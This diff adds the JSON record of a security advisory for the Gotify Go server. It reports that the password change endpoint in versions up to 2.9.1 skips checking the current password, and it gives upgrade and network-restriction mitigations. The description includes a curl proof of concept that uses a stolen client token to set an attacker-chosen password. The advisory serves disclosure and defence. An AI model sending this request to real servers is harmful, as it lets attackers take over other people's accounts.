@@ -1,0 +1,62 @@
+{
+  "Severity": "MODERATE",
+  "UpdatedAt": "2026-10-15T20:15:40Z",
+  "Package": {
+    "Ecosystem": "GO",
+    "Name": "github.com/gotify/server/v2"
+  },
+  "Advisory": {
+    "DatabaseId": 513485,
+    "Id": "GSA_kwCzR0hTQS0zaGNqLTltN3Atd3dtOc4AB9XN",
+    "GhsaId": "GHSA-3hcj-9m7p-wwm9",
+    "References": [
+      {
+        "Url": "https://github.com/gotify/server/security/advisories/GHSA-3hcj-9m7p-wwm9"
+      },
+      {
+        "Url": "https://nvd.nist.gov/vuln/detail/CVE-2026-102603"
+      },
+      {
+        "Url": "https://github.com/gotify/server/pull/952"
+      },
+      {
+        "Url": "https://github.com/gotify/server/commit/a8744482c668e07a61798573ec8e17bd3f6009f9"
+      },
+      {
+        "Url": "https://github.com/gotify/server/releases/tag/v3.0.0"
+      },
+      {
+        "Url": "https://github.com/advisories/GHSA-3hcj-9m7p-wwm9"
+      }
+    ],
+    "Identifiers": [
+      {
+        "Type": "GHSA",
+        "Value": "GHSA-3hcj-9m7p-wwm9"
+      },
+      {
+        "Type": "CVE",
+        "Value": "CVE-2026-102603"
+      }
+    ],
+    "Description": "The password change endpoint (`POST /current/user/password`) in Gotify versions \u003c= 2.9.1 does not require knowledge of the current password. An attacker in possession of a valid client token can set a new password for the affected user. Recovering the account requires administrator intervention or direct database access.\n\n## PoC\n\n```bash\n# Attacker has obtained a client token\n# No prior password knowledge required\nSTOLEN_TOKEN=\"Cxxxxxxxxxx\"\n\ncurl -X POST \"http://gotify-host/current/user/password?token=${STOLEN_TOKEN}\" \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"pass\":\"attacker_controls_this\"}'\n# Expected response:\n# HTTP/1.1 200 OK\n```\n\n## Mitigation\n\n- Upgrade to Gotify 3.0.0, which introduces step-up authentication: changing the  password now requires re-authenticating with the account password, or\n- Restrict access to the state-changing endpoints under `/user` and  `/current/user` to trusted networks.",
+    "Origin": "UNSPECIFIED",
+    "PublishedAt": "2026-10-15T20:15:38Z",
+    "Severity": "MODERATE",
+    "Summary": "Gotify: Insufficiently Protected Password Change endpoint",
+    "UpdatedAt": "2026-10-15T20:15:40Z",
+    "WithdrawnAt": "",
+    "CVSS": {
+      "Score": 0,
+      "VectorString": ""
+    }
+  },
+  "Versions": [
+    {
+      "FirstPatchedVersion": {
+        "Identifier": ""
+      },
+      "VulnerableVersionRange": "\u003c= 2.9.1"
+    }
+  ]
+}
